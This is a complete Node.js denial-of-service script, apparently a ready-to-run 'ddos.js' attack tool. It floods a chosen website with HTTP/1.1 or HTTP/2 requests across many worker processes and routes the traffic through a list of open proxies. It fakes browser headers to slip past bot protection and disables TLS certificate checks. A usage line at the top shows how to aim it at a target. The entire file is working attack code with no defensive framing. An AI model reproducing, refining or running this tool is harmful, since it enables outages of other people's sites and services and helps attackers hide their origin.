/*  
node ddos.js example.com 60 10 proxys.txt 100 GET
*/
const url = require('url'),
    fs = require('fs'),
    http2 = require('http2'),
    http = require('http'),
    net = require('net'),
    tls = require('tls'),
    cluster = require('cluster'),
    { HeaderGenerator } = require('header-generator'),
    ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
    ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

let headerGenerator = new HeaderGenerator({
    browsers: [
        {name: "chrome", minVersion: 65, httpVersion: "2"},
        {name: "firefox", minVersion: 80, httpVersion: "2"},
        {name: "safari", httpVersion: "2"},
    ],
    devices: [
        "desktop",
        "mobile"
    ],
    operatingSystems: [
        "linux",
        "windows",
        "macos",
        "android",
        "ios"
    ],
    locales: ["en-US", "en"]
});

tls.DEFAULT_ECDH_CURVE;
tls.authorized = true;
tls.sync = true;

let target = process.argv[2],
    time = process.argv[3],
    thread = process.argv[4],
    proxys = fs.readFileSync(process.argv[5], 'utf-8').toString().match(/\S+/g),
    rps = process.argv[6],
    type = process.argv[7];

function proxyr() {
    return proxys[Math.floor(Math.random() * proxys.length)];
}

if (cluster.isMaster) {
    console.log(`Target: ${target} | Threads: ${thread} | RPS: ${rps} | Method: ${type}`);

    for (var bb = 0; bb < thread; bb++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(-1);
    }, time * 1000)

} else {
    function flood() {
        var parsed = url.parse(target);
        var proxy = proxyr().split(':');
        let randomHeaders = headerGenerator.getHeaders();
        var header = randomHeaders;

        if(parsed.protocol == "https:") {
            randomHeaders[":path"] = parsed.path;
            randomHeaders[":method"] = type;
            randomHeaders[":scheme"] = parsed.protocol.replace(":", "");
            randomHeaders[":authority"] = parsed.host;
        }
        const agent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 50000,
            maxSockets: Infinity,
            maxTotalSockets: Infinity,
            maxSockets: Infinity
        });
        var req = http.request({
            host: proxy[0],
            agent: agent,
            globalAgent: agent,
            port: proxy[1],
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
            },
            method: 'CONNECT',
            path: parsed.host
        }, function() {
            req.setSocketKeepAlive(true);
        });
        const sigalgs = [
            'ecdsa_secp256r1_sha256',
            'ecdsa_secp384r1_sha384',
            'ecdsa_secp521r1_sha512',
            'rsa_pss_rsae_sha256',
            'rsa_pss_rsae_sha384',
            'rsa_pss_rsae_sha512',
            'rsa_pkcs1_sha256',
            'rsa_pkcs1_sha384',
            'rsa_pkcs1_sha512',
        ];

        let SignalsList = sigalgs.join(':');
        
        const uri = new URL(target)

        const port = uri.port == '' ? parsed.protocol == "https" ? 443 : 80 : parseInt(uri.port)


        req.on('connect', function(res, socket, head) {

            if(parsed.protocol == "https:") {
                const client = http2.connect(parsed.href, {
                    createConnection: () => tls.connect({
                        host: parsed.host,
                        ciphers: tls.getCiphers().standardName,
                        secureProtocol: ['TLSv1_1_method', 'TLSv1_2_method', 'TLSv1_3_method'],
                        port,
                        servername: parsed.host,
                        maxRedirects: 20,
                        followAllRedirects: true,
                        secure: true,
                        sigalgs: SignalsList,
                        rejectUnauthorized: false,
                        honorCipherOrder: true,
                        ALPNProtocols: ['h2', 'http1.1'],
                        sessionTimeout: 5000,
                        socket: socket
                    }, function() {
                        for (let i = 0; i < rps; i++) {
                            const req = client.request(header);
                            req.setEncoding('utf8');
                            req.on('data', (chunk) => {
                            });
                            req.on("response", () => {
                                req.close();
                            })
                            req.end();
                        }
                    })
                });
            }
            else {
                let requestPayload = `${type} ${parsed.href} HTTP/1.1\r\n`;

                randomHeaders = {}
                randomHeaders["Host"] = parsed.host;
                randomHeaders["Connection"] = "keep-alive";

                for (const header in randomHeaders) 
                {
                    function titleCase(str) 
                    {
                        const splitStr = str.toLowerCase().split('-');

                        for (let i = 0; i < splitStr.length; i++) {
                            splitStr[i] = splitStr[i].charAt(0).toUpperCase() + splitStr[i].substring(1);     
                        }

                        return splitStr.join('-'); 
                    }      
            
                    requestPayload += titleCase(header) + ": " + randomHeaders[header] + "\r\n"
                }
                requestPayload += "\r\n"

                let socket = net.connect(proxy[1], proxy[0]);
                
                socket.setKeepAlive(true, 5000);
                socket.setTimeout(5000);

                socket.once('error', err => { socket.destroy() });
                socket.once('disconnect', () => {});

                socket.once('data', () => setTimeout( () => socket.destroy(), 10000))

                for (let i = 0; i < rps; i++) {
                    socket.write(Buffer.from(requestPayload, "binary"))
                }

                socket.on('data', function() {
                    setTimeout(function() {
                        socket.destroy();
                        return delete socket;
                    }, 5000);
                });
            }
        });
        req.end();  
    }

    setInterval(() => {
        flood()
    })
}